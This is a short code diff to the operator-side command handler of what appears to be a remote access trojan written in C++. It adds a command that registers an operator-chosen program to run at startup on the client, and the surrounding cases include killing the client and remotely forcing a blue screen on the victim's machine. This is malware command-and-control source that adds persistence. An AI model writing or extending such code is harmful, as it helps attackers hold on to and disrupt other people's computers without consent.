@@ -599,13 +599,24 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
         cmdInfo.action = RemoteAction::kKillClient;
         cmdInfo.buffLen = 0;
-        std::cout << "??" << std::endl;
         performed = true;
         break;
+    case RemoteAction::kAddToStartup: {
+        std::string input;
+        std::cout << "Path of program to add to startup: ";
+        std::getline(std::cin, input);
+        
+        cmdInfo.insert(input);
+
+        if ( cmdInfo.buffLen == -1 )
+            break;
+
+        performed = true;
+        break;
+    }
     // no additional user input required 
     case RemoteAction::kRemoteBSOD:
         cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
-        std::cout << "doing a bsod!" << std::endl;
         performed = true;
         break;
     case RemoteAction::kPingClient:
